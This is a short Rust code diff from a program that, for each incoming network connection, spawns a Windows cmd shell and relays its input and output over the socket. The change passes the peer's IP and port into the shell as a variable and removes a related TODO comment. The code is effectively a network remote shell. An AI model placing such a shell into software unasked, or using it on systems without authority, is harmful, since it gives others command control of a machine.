@@ -59,13 +59,12 @@ fn main() {
             println!("Connected to: {}", peer_addr);
 
             let mut process = Command::new("cmd")
+                                      .arg(format!("/K set ip=[{}]:8080\n", peer_addr.ip()))
                                       .stdin(Stdio::piped())
                                       .stdout(Stdio::piped())
                                       .stderr(Stdio::piped())
                                       .spawn()
                                       .unwrap();
-
-            //TODO:: Set a %client% variable in cmd (e.g. set client = peer_addr) so that the client can use the http server to send back to itself without having to know it's own ip
 
             relay_stream_async(process.stderr.take().unwrap(), stream.try_clone().unwrap());
             relay_stream_async(process.stdout.take().unwrap(), stream.try_clone().unwrap());
@@ -90,6 +89,8 @@ fn main() {
                 return;
             }
         };
+        
+        println!("Connected");
 
         thread::spawn(|| {
             let mut mount = Mount::new();
